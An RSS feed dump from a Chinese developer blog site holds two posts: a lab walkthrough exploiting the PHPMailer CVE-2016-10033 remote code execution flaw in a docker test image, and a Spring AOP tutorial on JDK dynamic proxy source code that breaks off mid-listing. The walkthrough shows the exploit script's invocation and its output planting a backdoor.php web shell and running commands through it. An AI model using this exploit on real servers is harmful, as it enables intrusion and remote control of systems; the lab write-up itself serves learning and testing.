<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>PHPMailer &lt; 5.2.18 远程代码执行漏洞（CVE-2016-10033） - starnight_cyber</title>
<link>http://www.cnblogs.com/Hi-blog/p/7812008.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/Hi-blog/p/7812008.html</guid>
<description>&lt;h3&gt;PHPMailer &amp;lt; 5.2.18 Remote Code Execution　&lt;/h3&gt;
&lt;p&gt;　　本文将简单展示一下PHPMailer远程代码执行漏洞(CVE-2016-10033)的利用过程，使用的是别人已经搭建好的docker环境，见参考链接。&lt;/p&gt;
&lt;p&gt;　　实验环境是在Ubuntu 16.04.3上，使用docker镜像。&lt;/p&gt;
&lt;h3&gt;安装和使用docker镜像&lt;/h3&gt;
&lt;p&gt;　　首先需要在ubuntu上安装docker，可使用如下命令进行安装：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
root@starnight:~# &lt;strong&gt;apt-&lt;span&gt;get&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;&lt;strong&gt; install docker.io&lt;/strong&gt;　　　　【安装docker】
root@starnight:&lt;/span&gt;~# &lt;strong&gt;docker run --rm -it -p &lt;span&gt;8080&lt;/span&gt;:&lt;span&gt;80&lt;/span&gt; vulnerables/cve-&lt;span&gt;2016&lt;/span&gt;-&lt;span&gt;10033&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;
AH00558: apache2: Could not reliably determine the server&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;s fully qualified domain name, using 172.17.0.2. Set the &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;ServerName&lt;span&gt;'&lt;/span&gt;&lt;span&gt; directive globally to suppress this message&lt;/span&gt;
==&amp;gt; /&lt;span&gt;var&lt;/span&gt;/log/apache2/access.log &amp;lt;==

==&amp;gt; /&lt;span&gt;var&lt;/span&gt;/log/apache2/error.log &amp;lt;==&lt;span&gt;
[Thu Nov &lt;/span&gt;&lt;span&gt;09&lt;/span&gt; &lt;span&gt;15&lt;/span&gt;:&lt;span&gt;11&lt;/span&gt;:&lt;span&gt;47.098917&lt;/span&gt; &lt;span&gt;2017&lt;/span&gt;] [mpm_prefork:notice] [pid &lt;span&gt;8&lt;/span&gt;] AH00163: Apache/&lt;span&gt;2.4&lt;/span&gt;.&lt;span&gt;10&lt;/span&gt; (Debian) configured --&lt;span&gt; resuming normal operations
[Thu Nov &lt;/span&gt;&lt;span&gt;09&lt;/span&gt; &lt;span&gt;15&lt;/span&gt;:&lt;span&gt;11&lt;/span&gt;:&lt;span&gt;47.101902&lt;/span&gt; &lt;span&gt;2017&lt;/span&gt;] [core:notice] [pid &lt;span&gt;8&lt;/span&gt;] AH00094: Command line: &lt;span&gt;'&lt;/span&gt;&lt;span&gt;/usr/sbin/apache2 -f /etc/apache2/apache2.conf&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;

==&amp;gt; /&lt;span&gt;var&lt;/span&gt;/log/apache2/other_vhosts_access.log &amp;lt;==
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　安装完docker之后，需要把相应的靶机环境下载(pull)下来，首次运行上面那条命令会下载docker镜像，之后就会像上面运行的那样，表明docker镜像正在运行。&lt;/p&gt;
&lt;p&gt;　　查看一下ip地址:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
root@starnight:~# &lt;span&gt;ifconfig&lt;/span&gt; | &lt;span&gt;grep&lt;/span&gt;&lt;span&gt; inet
          inet addr:&lt;/span&gt;&lt;strong&gt;&lt;span&gt;172.17&lt;/span&gt;.&lt;span&gt;0.1&lt;/span&gt;&lt;/strong&gt;  Bcast:&lt;span&gt;0.0&lt;/span&gt;.&lt;span&gt;0.0&lt;/span&gt;  Mask:&lt;span&gt;255.255&lt;/span&gt;.&lt;span&gt;0.0&lt;/span&gt;&lt;span&gt;
          inet6 addr: fe80::&lt;/span&gt;&lt;span&gt;42&lt;/span&gt;:4aff:fe88:49e5/&lt;span&gt;64&lt;/span&gt;&lt;span&gt; Scope:Link
          inet addr:&lt;/span&gt;&lt;strong&gt;&lt;span&gt;192.168&lt;/span&gt;.&lt;span&gt;0.8&lt;/span&gt;&lt;/strong&gt;  Bcast:&lt;span&gt;192.168&lt;/span&gt;.&lt;span&gt;0.255&lt;/span&gt;  Mask:&lt;span&gt;255.255&lt;/span&gt;.&lt;span&gt;255.0&lt;/span&gt;&lt;span&gt;
          inet6 addr: fe80::a7c0:e1f7:&lt;/span&gt;&lt;span&gt;2118&lt;/span&gt;:7e6a/&lt;span&gt;64&lt;/span&gt;&lt;span&gt; Scope:Link
          inet addr:&lt;/span&gt;&lt;span&gt;127.0&lt;/span&gt;.&lt;span&gt;0.1&lt;/span&gt;  Mask:&lt;span&gt;255.0&lt;/span&gt;.&lt;span&gt;0.0&lt;/span&gt;&lt;span&gt;
          inet6 addr: ::&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;/&lt;span&gt;128&lt;/span&gt;&lt;span&gt; Scope:Host
          inet6 addr: fe80::98a9:5bff:fe1f:b1c9&lt;/span&gt;/&lt;span&gt;64&lt;/span&gt; Scope:Link
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　这里192.168.0.8是我们Ubuntu的ip地址，172.17.0.1是docker镜像的内部地址，通过访问http://192.168.0.8:8080/， 就能看到搭建好的存在漏洞的环境：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/624934/201711/624934-20171109231832981-614367471.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h3&gt;漏洞测试&lt;/h3&gt;
&lt;p&gt;　　接下来我们使用kali来进行测试， 下载&lt;a href=&quot;https://github.com/opsxcq/exploit-CVE-2016-10033&quot; target=&quot;_blank&quot;&gt;exploit-CVE-2016-10033&lt;/a&gt;中的&lt;a id=&quot;a80a34800862b56cf70a8bc707a5296b-e6e42a687e84f4f40eb8d77f2cd817abd8ab8356&quot; class=&quot;js-navigation-open&quot; title=&quot;exploit.sh&quot; href=&quot;https://github.com/opsxcq/exploit-CVE-2016-10033/blob/master/exploit.sh&quot;&gt;exploit.sh&lt;/a&gt;到本地，运行如下命令进行测试：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
root@kali:~/penetest/CVE-&lt;span&gt;2016&lt;/span&gt;-&lt;span&gt;10033&lt;/span&gt;# &lt;strong&gt;./exploit.&lt;span&gt;sh&lt;/span&gt; &lt;span&gt;192.168&lt;/span&gt;.&lt;span&gt;0.8&lt;/span&gt;:&lt;span&gt;8080&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;
[&lt;/span&gt;+] CVE-&lt;span&gt;2016&lt;/span&gt;-&lt;span&gt;10033&lt;/span&gt;&lt;span&gt; exploit by opsxcq
[&lt;/span&gt;+] Exploiting &lt;span&gt;192.168&lt;/span&gt;.&lt;span&gt;0.8&lt;/span&gt;:&lt;span&gt;8080&lt;/span&gt;&lt;span&gt;
[&lt;/span&gt;+] Target exploited, acessing shell at http:&lt;span&gt;//&lt;/span&gt;&lt;span&gt;192.168.0.8:8080/backdoor.php&lt;/span&gt;
[+] Checking &lt;span&gt;if&lt;/span&gt;&lt;span&gt; the backdoor was created on target system
[&lt;/span&gt;+&lt;span&gt;] Backdoor.php found on remote system
[&lt;/span&gt;+] Running &lt;span&gt;whoami&lt;/span&gt;&lt;span&gt;
www&lt;/span&gt;-&lt;span&gt;data
RemoteShell&lt;/span&gt;&amp;gt; &lt;strong&gt;&lt;span&gt;ls&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;
[&lt;/span&gt;+] Running &lt;span&gt;ls&lt;/span&gt;&lt;span&gt;&lt;strong&gt;
vulnerable&lt;/strong&gt;
RemoteShell&lt;/span&gt;&amp;gt; &lt;span&gt;pwd&lt;/span&gt;&lt;span&gt;
[&lt;/span&gt;+] Running &lt;strong&gt;&lt;span&gt;pwd&lt;/span&gt;&lt;/strong&gt;
&lt;strong&gt;/www&lt;/strong&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　其实，并不是所有的命令运行都有回显，比如说查看ip地址的命令ifconfig就看不到输出。更多详情，请参考下面的链接。&lt;/p&gt;
&lt;h3&gt;References&lt;/h3&gt;
&lt;p&gt;　　&lt;a href=&quot;https://github.com/opsxcq/exploit-CVE-2016-10033&quot; target=&quot;_blank&quot;&gt;opsxcq/exploit-CVE-2016-10033&lt;/a&gt;　　&lt;/p&gt;
</description>
<pubDate>Thu, 09 Nov 2017 15:27:00 +0000</pubDate>
<dc:creator>starnight_cyber</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/Hi-blog/p/7812008.html</dc:identifier>
</item>
<item>
<title>Spring AOP高级——源码实现（1）动态代理技术 - 余林丰</title>
<link>http://www.cnblogs.com/yulinfeng/p/7811965.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/yulinfeng/p/7811965.html</guid>
<description>&lt;p&gt;　　在正式进入Spring AOP的源码实现前，我们需要准备一定的基础也就是面向切面编程的核心——动态代理。 动态代理实际上也是一种结构型的设计模式，JDK中已经为我们准备好了这种设计模式，不过这种JDK为我们提供的动态代理有2个缺点：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;&lt;strong&gt;只能代理实现了接口的目标对象；&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;基于反射，效率低&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;　　鉴于以上2个缺点，于是就出现了第二种动态代理技术——CGLIB（Code Generation Library）。这种代理技术一是不需要目标对象实现接口（这大大扩展了使用范围），二是它是基于字节码实现（这比反射效率高）。当然它并不是完全没有缺点，&lt;strong&gt;因为它不能代理final方法&lt;/strong&gt;（因为它的动态代理实际是生成目标对象的子类）。&lt;/p&gt;
&lt;p&gt;　　Spring AOP中生成代理对象时既可以使用JDK的动态代理技术，也可以使用CGLIB的动态代理技术，本章首先对这两者动态代理技术做简要了解，便于后续源码的理解。&lt;/p&gt;

&lt;p&gt;　　JDK动态代理技术首先要求我们目标对象需要实现一个接口：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1&lt;/span&gt; &lt;span&gt;package&lt;/span&gt;&lt;span&gt; proxy;
&lt;/span&gt;&lt;span&gt;2&lt;/span&gt; 
&lt;span&gt;3&lt;/span&gt; &lt;span&gt;/**&lt;/span&gt;
&lt;span&gt;4&lt;/span&gt; &lt;span&gt; * Created by Kevin on 2017/11/8.
&lt;/span&gt;&lt;span&gt;5&lt;/span&gt;  &lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;6&lt;/span&gt; &lt;span&gt;public&lt;/span&gt; &lt;span&gt;interface&lt;/span&gt;&lt;span&gt; Subject {
&lt;/span&gt;&lt;span&gt;7&lt;/span&gt;     &lt;span&gt;void&lt;/span&gt;&lt;span&gt; sayHello();
&lt;/span&gt;&lt;span&gt;8&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　接下来就是我们需要代理的真实对象，即目标对象：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;package&lt;/span&gt;&lt;span&gt; proxy;
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt; 
&lt;span&gt; 3&lt;/span&gt; &lt;span&gt;/**&lt;/span&gt;
&lt;span&gt; 4&lt;/span&gt; &lt;span&gt; * 目标对象，即需要被代理的对象
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt; &lt;span&gt; * Created by Kevin on 2017/11/8.
&lt;/span&gt;&lt;span&gt; 6&lt;/span&gt;  &lt;span&gt;*/&lt;/span&gt;
&lt;span&gt; 7&lt;/span&gt; &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; RealSubject &lt;span&gt;implements&lt;/span&gt;&lt;span&gt; Subject{
&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; sayHello() {
&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt;         System.out.println(&quot;hello world&quot;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;10&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　这是一个真实的对象，我们希望在不更改原有代码逻辑的基础上增强该类的sayHello方法，利用JDK动态代理技术需要我们实现InvocationHandler接口中的invoke方法：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;package&lt;/span&gt;&lt;span&gt; proxy;
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt; 
&lt;span&gt; 3&lt;/span&gt; &lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.lang.reflect.InvocationHandler;
&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt; &lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.lang.reflect.Method;
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt; 
&lt;span&gt; 6&lt;/span&gt; &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; ProxySubject &lt;span&gt;implements&lt;/span&gt;&lt;span&gt; InvocationHandler {
&lt;/span&gt;&lt;span&gt; 7&lt;/span&gt;     &lt;span&gt;private&lt;/span&gt;&lt;span&gt; Object target;
&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt; 
&lt;span&gt; 9&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt;&lt;span&gt; ProxySubject(Object target) {
&lt;/span&gt;&lt;span&gt;10&lt;/span&gt;         &lt;span&gt;this&lt;/span&gt;.target =&lt;span&gt; target;
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;12&lt;/span&gt; 
&lt;span&gt;13&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt; Object invoke(Object proxy, Method method, Object[] args) &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; Throwable {
&lt;/span&gt;&lt;span&gt;14&lt;/span&gt;         System.out.println(&quot;调用前&quot;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;15&lt;/span&gt;         Object object =&lt;span&gt; method.invoke(target, args);
&lt;/span&gt;&lt;span&gt;16&lt;/span&gt;         System.out.println(&quot;调用后&quot;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;17&lt;/span&gt;         &lt;span&gt;return&lt;/span&gt;&lt;span&gt; object;
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;19&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　第15行，在invoke方法中可以看到，在调用目标对象的方法前后我们对方法进行了增加，这其实就是AOP中Before和After通知的奥义所在。&lt;/p&gt;
&lt;p&gt;　　加入测试代码：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;package&lt;/span&gt;&lt;span&gt; proxy;
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt; 
&lt;span&gt; 3&lt;/span&gt; &lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.lang.reflect.Proxy;
&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt; 
&lt;span&gt; 5&lt;/span&gt; &lt;span&gt;/**&lt;/span&gt;
&lt;span&gt; 6&lt;/span&gt; &lt;span&gt; * Created by Kevin on 2017/11/8.
&lt;/span&gt;&lt;span&gt; 7&lt;/span&gt;  &lt;span&gt;*/&lt;/span&gt;
&lt;span&gt; 8&lt;/span&gt; &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; Test {
&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; main(String[] args) {
&lt;/span&gt;&lt;span&gt;10&lt;/span&gt;         Subject subject = (Subject) Proxy.newProxyInstance(RealSubject.&lt;span&gt;class&lt;/span&gt;.getClassLoader(), RealSubject.&lt;span&gt;class&lt;/span&gt;.getInterfaces(), &lt;span&gt;new&lt;/span&gt; ProxySubject(&lt;span&gt;new&lt;/span&gt;&lt;span&gt; RealSubject()));
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt; &lt;span&gt;        subject.sayHello();
&lt;/span&gt;&lt;span&gt;12&lt;/span&gt; 
&lt;span&gt;13&lt;/span&gt;         &lt;span&gt;//&lt;/span&gt;&lt;span&gt;查看subject对象的类型&lt;/span&gt;
&lt;span&gt;14&lt;/span&gt; &lt;span&gt;        System.out.println(subject.getClass().getName());
&lt;/span&gt;&lt;span&gt;15&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;16&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　执行结果：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/630246/201711/630246-20171109225742013-589217627.png&quot; alt=&quot;&quot; width=&quot;371&quot; height=&quot;118&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　可以看到和AOP几乎一样，前面提到过，动态代理就是AOP的核心。同时我们可以看到被代理的类的类型是：com.sun.proxy.$Proxy0。等会深入JDK源码时我们将会看到为什么。&lt;/p&gt;
&lt;p&gt;　　回到上面的例子，我们通过Proxy. newProxyInstance生成了一个代理类，显然这个类是在Run-Time（运行时）生成的，也就是说，JDK动态代理中代理类的生成来自于Java反射机制的支撑。&lt;/p&gt;
&lt;p&gt;　　上面例子中我们将实现InvocationHandler的类取名为“ProxySubject”，这其实是不准确的，我们看到了最后代理类的类型并不是ProxySubject，这个类实际上是处理需要增强的方法，也就是在invoke中的实现逻辑，最后并不是生成这个类型的代理类，这也不是生成的代理类，所以取名这个是不准确的。&lt;/p&gt;
&lt;p&gt;　　首先从Proxy.newProxyInstance开始，来研究JDK是如何生成代理类的。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; Object newProxyInstance(ClassLoader loader, Class&amp;lt;?&amp;gt;[] interfaces, InvocationHandler h)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　该方法有3个参数，了解JVM类加载的可能知道确定为同一个类需要有2个条件：&lt;/p&gt;
&lt;p&gt;　　要想生成目标对象的代理首先就要确保其类加载器相同，所以需要将目标对象的类加载器作为参数传递；其次JDK动态代理技术需要代理类和目标对象都继承自同一接口，所以需要将目标对象的接口作为参数传递；最后，传递InvocationHandler，这是主角，因为我们对目标对象的增强逻辑在这个实现类中，传递该对象使得代理类能够对其进行调用。&lt;/p&gt;
&lt;p&gt;　　在Proxy.newProxyInstance方法中创建代理类的过程主要有3步：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/630246/201711/630246-20171109230044716-741865672.png&quot; alt=&quot;&quot; width=&quot;354&quot; height=&quot;352&quot;/&gt;&lt;/p&gt;
&lt;h2&gt;1.检查&lt;/h2&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt;&lt;span&gt; Object newProxyInstance(ClassLoader loader,
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt;                                       Class&amp;lt;?&amp;gt;&lt;span&gt;[] interfaces,
&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt; &lt;span&gt;                                      InvocationHandler h)
&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt;     &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; IllegalArgumentException
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt; &lt;span&gt;{
&lt;/span&gt;&lt;span&gt; 6&lt;/span&gt;     Objects.requireNonNull(h);    &lt;span&gt;//&lt;/span&gt;&lt;span&gt;1.1检查参数是否为空&lt;/span&gt;
&lt;span&gt; 7&lt;/span&gt; 
&lt;span&gt; 8&lt;/span&gt;     &lt;span&gt;final&lt;/span&gt; Class&amp;lt;?&amp;gt;[] intfs =&lt;span&gt; interfaces.clone();
&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt;     &lt;span&gt;final&lt;/span&gt; SecurityManager sm = System.getSecurityManager();    &lt;span&gt;//&lt;/span&gt;&lt;span&gt;获取安全管理器，安全管理器用于对外部资源的访问控制&lt;/span&gt;
&lt;span&gt;10&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt; (sm != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt;         checkProxyAccess(Reflection.getCallerClass(), loader, intfs);    &lt;span&gt;//&lt;/span&gt;&lt;span&gt;1.2检查是否有访问权限&lt;/span&gt;
&lt;span&gt;12&lt;/span&gt;     }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　在上面源码中有一个获取安全管理器以及检查是否具有访问权限的过程。安全管理器可能在实际中不太常用，它是为了程序在某些敏感资源的访问上做的权限控制，也就是起到保护程序的作用。在这里暂时不用仔细去探究，只需要大概了解即可。这里做的权限检查实际上是对ClassLoader的检查，例如：有的程序不允许你对类进行代理，此时加入安全管理器即可防止你对该类的代理。&lt;/p&gt;
&lt;h2&gt;2.获取代理类型&lt;/h2&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
Class&amp;lt;?&amp;gt; cl = getProxyClass0(loader, intfs);    &lt;span&gt;//&lt;/span&gt;&lt;span&gt;获取代理类类型&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　这句话通过目标对象的类加载器，以及它所继承的接口，即可获取代理类的类型。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;/**&lt;/span&gt;
&lt;span&gt; 2&lt;/span&gt; &lt;span&gt; * Generate a proxy class.  Must call the checkProxyAccess method
&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt; &lt;span&gt; * to perform permission checks before calling this.
&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt; &lt;span&gt;*从注释中可以看到，这个方法用于生成代理类，在调用此方法前必须要确保
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt; &lt;span&gt;*已经做过权限检查。
&lt;/span&gt;&lt;span&gt; 6&lt;/span&gt;  &lt;span&gt;*/&lt;/span&gt;
&lt;span&gt; 7&lt;/span&gt; &lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; Class&amp;lt;?&amp;gt;&lt;span&gt; getProxyClass0(ClassLoader loader,
&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt;                                        Class&amp;lt;?&amp;gt;&lt;span&gt;... interfaces) {
&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt; (interfaces.length &amp;gt; 65535) {        &lt;span&gt;//&lt;/span&gt;&lt;span&gt;一个类最多实现65535个接口&lt;/span&gt;
&lt;span&gt;10&lt;/span&gt;         &lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; IllegalArgumentException(&quot;interface limit exceeded&quot;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;12&lt;/span&gt;     &lt;span&gt;return&lt;/span&gt; proxyClassCache.get(loader, interfaces);    &lt;span&gt;//&lt;/span&gt;&lt;span&gt;先从缓存中获取代理类，如果不存在则通过ProxyClassFactory创建，这其中会涉及到比较复杂的代理缓存机制，本篇主要讲动态代理过程的源码实现，对于动态代理的缓存机制在以后再研究。&lt;/span&gt;
&lt;span&gt;13&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　上面的方法返回的是com.sun.proxy.$Proxy0代理类型，下面就会通过这个代理类型生成代理类。&lt;/p&gt;
&lt;h2&gt; 3.生成代理类&lt;/h2&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt; (sm != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt;         checkNewProxyPermission(Reflection.getCallerClass(), cl);    &lt;span&gt;//&lt;/span&gt;&lt;span&gt;这里还需要做一次检查，检查的是生成的代理类型做权限检查，当然前提还是通过System.setSecurityManager设置安全管理类&lt;/span&gt;
&lt;span&gt; 4&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt; 
&lt;span&gt; 6&lt;/span&gt;     &lt;span&gt;final&lt;/span&gt; Constructor&amp;lt;?&amp;gt; cons = cl.getConstructor(constructorParams);    &lt;span&gt;//&lt;/span&gt;&lt;span&gt;通过反射获取构造器，cl是代理类型其构造器的参数类型为InvocationHandler，所以参数传入InvocationHandler&lt;/span&gt;
&lt;span&gt; 7&lt;/span&gt;     &lt;span&gt;final&lt;/span&gt; InvocationHandler ih =&lt;span&gt; h;
&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt; (!Modifier.isPublic(cl.getModifiers())) {   &lt;span&gt;//&lt;/span&gt;&lt;span&gt;判断目标对象的构造器修饰符是我否为public，如果不是则不能生成代理类，返回null&lt;/span&gt;
&lt;span&gt; 9&lt;/span&gt;         AccessController.doPrivileged(&lt;span&gt;new&lt;/span&gt; PrivilegedAction&amp;lt;Void&amp;gt;&lt;span&gt;() {
&lt;/span&gt;&lt;span&gt;10&lt;/span&gt;             &lt;span&gt;public&lt;/span&gt;&lt;span&gt; Void run() {
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt;                 cons.setAccessible(&lt;span&gt;true&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;12&lt;/span&gt;                 &lt;span&gt;return&lt;/span&gt; &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;13&lt;/span&gt; &lt;span&gt;            }
&lt;/span&gt;&lt;span&gt;14&lt;/span&gt; &lt;span&gt;        });
&lt;/span&gt;&lt;span&gt;15&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;16&lt;/span&gt;     &lt;span&gt;return&lt;/span&gt; cons.newInstance(&lt;span&gt;new&lt;/span&gt; Object[]{h});    &lt;span&gt;//&lt;/span&gt;&lt;span&gt;最后生成代理类&lt;/span&gt;
&lt;span&gt;17&lt;/span&gt; } &lt;span&gt;catch&lt;/span&gt; (IllegalAccessException|&lt;span&gt;InstantiationException e) {
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt;     &lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; InternalError(e.toString(), e);
&lt;/span&gt;&lt;span&gt;19&lt;/span&gt; } &lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (InvocationTargetException e) {
&lt;/span&gt;&lt;span&gt;20&lt;/span&gt;     Throwable t =&lt;span&gt; e.getCause();
&lt;/span&gt;&lt;span&gt;21&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt; (t &lt;span&gt;instanceof&lt;/span&gt;&lt;span&gt; RuntimeException) {
&lt;/span&gt;&lt;span&gt;22&lt;/span&gt;         &lt;span&gt;throw&lt;/span&gt;&lt;span&gt; (RuntimeException) t;
